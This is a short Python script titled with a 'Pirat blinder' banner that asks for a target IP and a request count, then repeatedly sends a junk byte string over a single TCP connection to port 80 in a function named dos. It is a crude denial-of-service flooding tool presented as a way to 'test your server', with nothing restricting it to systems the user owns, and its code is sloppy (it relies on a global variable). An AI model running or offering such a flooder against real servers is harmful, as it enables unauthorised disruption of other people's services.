import socket
from termcolor import colored as c

print(c("""
------- Just run und Test Your Server with the script -------
  _____ _           _     _     _ _           _           
 |  __ (_)         | |   | |   | (_)         | |          
 | |__) | _ __ __ _| |_  | |__ | |_ _ __   __| | ___ _ __ 
 |  ___/ | '__/ _` | __| | '_ \| | | '_ \ / _` |/ _ \ '__|
 | |   | | | | (_| | |_  | |_) | | | | | | (_| |  __/ |   
 |_|   |_|_|  \__,_|\__| |_.__/|_|_|_| |_|\__,_|\___|_|  s
                     ______                               
                    |______|                              
""","cyan"))

def dos(ip_target="127.0.0.1"):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_target, 80))
    
    
    data = "asdkasjdknoewndo+ä+#npcknjnwojqdpjp#jpani1j32opo534581iizgzgbk#+#+++123127j"
    data = data.encode("utf-8")
    i = 1
    for i in range(requests):
        sock.sendall(data)
        print(str(i) + ". [ sent ] ")
        i += 1
    print("Done")


ip_target = input("Enter Test Target IP :")
requests = int(input("How many request to send :"))

dos(ip_target)
